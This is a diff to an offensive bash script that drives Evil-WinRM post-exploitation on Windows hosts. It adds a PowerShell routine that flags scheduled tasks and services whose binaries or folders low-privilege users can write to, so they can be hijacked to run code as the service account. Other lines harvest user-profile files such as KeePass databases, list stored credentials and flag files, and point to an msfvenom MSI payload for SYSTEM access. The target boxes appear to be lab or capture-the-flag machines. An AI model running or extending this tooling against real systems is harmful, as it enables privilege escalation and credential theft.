@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.34.0"
+readonly VERSION="1.35.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2472,7 +2472,16 @@ _winrm_postex() {
     # task or a writable path). List them and READ the scripts — generic, catches
     # the pattern on any box without hard-coding a path.
     ps+='echo "===PROFFILES==="; Get-ChildItem C:\Users -Force -ErrorAction SilentlyContinue | %{ $p=$_.FullName; @("Documents","Desktop","Downloads") | %{ Get-ChildItem (Join-Path $p $_) -Recurse -Force -ErrorAction SilentlyContinue } } | ?{ $_.Extension -match "\.(ps1|bat|cmd|vbs|py|kdbx|txt|xml|config|json|ini|xlsx|docx)$" } | Select -First 30 -Expand FullName; '
-    ps+='echo "===PROFSCRIPTS==="; Get-ChildItem C:\Users -Recurse -Force -Include *.ps1,*.bat,*.cmd,*.vbs,*.py -ErrorAction SilentlyContinue | ?{ $_.FullName -notmatch "\\AppData\\" } | Select -First 12 | %{ "### "+$_.FullName; Get-Content $_.FullName -TotalCount 80 -ErrorAction SilentlyContinue }'
+    ps+='echo "===PROFSCRIPTS==="; Get-ChildItem C:\Users -Recurse -Force -Include *.ps1,*.bat,*.cmd,*.vbs,*.py -ErrorAction SilentlyContinue | ?{ $_.FullName -notmatch "\\AppData\\" } | Select -First 12 | %{ "### "+$_.FullName; Get-Content $_.FullName -TotalCount 80 -ErrorAction SilentlyContinue }; '
+    # GENERIC privesc auto-finder: for every non-default scheduled task and every
+    # service (binary outside system32), check whether the binary/script — or its
+    # parent directory — is writable by a low-priv principal (Users/Everyone/Auth
+    # Users/Domain Computers, i.e. us). If so, whatever runs it can be hijacked
+    # (overwrite the file, or plant a new file / DLL in the writable dir). No
+    # hard-coded task names or paths — pure ACL correlation.
+    ps+='echo "===HIJACK==="; function _cw($p){ if(-not $p){return ""}; $f=$p.Trim([char]34); $tg=@(); if($f){ $tg+=$f }; $pd=Split-Path $f -Parent; if($pd){ $tg+=$pd }; $o=@(); foreach($t in $tg){ if($t -and (Test-Path $t -ErrorAction SilentlyContinue)){ try{ $a=(Get-Acl $t).Access | ?{ $_.AccessControlType -eq "Allow" -and ($_.FileSystemRights -match "Write|Modify|FullControl|CreateFiles|AppendData|WriteData") -and ($_.IdentityReference -match "Everyone|Authenticated Users|BUILTIN.{0,2}Users|Domain Users|Domain Computers") }; if($a){ $o+=$t } }catch{} } }; return ($o -join "; ") }; '
+    ps+='Get-ScheduledTask -ErrorAction SilentlyContinue | ?{ $_.TaskPath -notmatch "\\Microsoft\\" } | %{ $u=$_.Principal.UserId; $n=$_.TaskName; foreach($ac in $_.Actions){ if($ac.Execute){ $w=_cw $ac.Execute; if($w){ "TASK [{0}] runas={1} exec={2}  WRITABLE: {3}" -f $n,$u,$ac.Execute,$w } } } }; '
+    ps+='Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ?{ $_.PathName -and $_.PathName -notmatch "system32" } | %{ $b=$_.PathName; if($b -match ([char]34+"([^"+[char]34+"]+)")){ $b=$Matches[1] } elseif($b -match "^(\S+)"){ $b=$Matches[1] }; $w=_cw $b; if($w){ "SVC [{0}] runas={1} bin={2}  WRITABLE: {3}" -f $_.Name,$_.StartName,$b,$w } }\'
     local out="$OUTDIR/winrm_postex_$(_safe_name "$USER").txt"
     _winrm_exec "$ps" | tee "$out" >>"$LOGFILE"
     [[ ! -s "$out" ]] && { info "WinRM post-ex produced no output (shell/Kerberos issue)"; return; }
@@ -2483,11 +2492,12 @@ _winrm_postex() {
         | grep -avE 'Evil-WinRM|quoting_detection|evil-winrm#|Establishing connection|PS C:\\|whoami /all; echo' >"$clean"
     # Show each non-empty section inline so the next step is visible, not buried.
     local sec body
-    for sec in CMDKEY FLAGS AIE SVC TASKS PROFFILES PROFSCRIPTS NONSTD CONFIGS WRITABLE CDRIVE; do
+    for sec in HIJACK CMDKEY FLAGS AIE SVC TASKS PROFFILES PROFSCRIPTS NONSTD CONFIGS WRITABLE CDRIVE; do
         body=$(awk "/===${sec}===/{f=1;next} /^===[A-Z]+===/{f=0} f" "$clean" | grep -vE '^[[:space:]]*$')
         [[ -z "$body" ]] && continue
         local cap=15
         case "$sec" in
+            HIJACK)     loot "${C_RED}${C_BOLD}★★ HIJACKABLE task/service — its binary or dir is writable by us → overwrite/plant to run AS the listed account:${C_RESET}"; cap=40 ;;
             CMDKEY)     [[ "$body" == *NONE* ]] && continue; loot "★ Stored credentials (cmdkey /list):" ;;
             FLAGS)      loot "★ Flag file(s) readable from this shell:" ;;
             AIE)        grep -qiE '0x1' <<<"$body" && loot "★ AlwaysInstallElevated=1 → MSI as SYSTEM (msfvenom -f msi -p windows/x64/exec)" || continue ;;
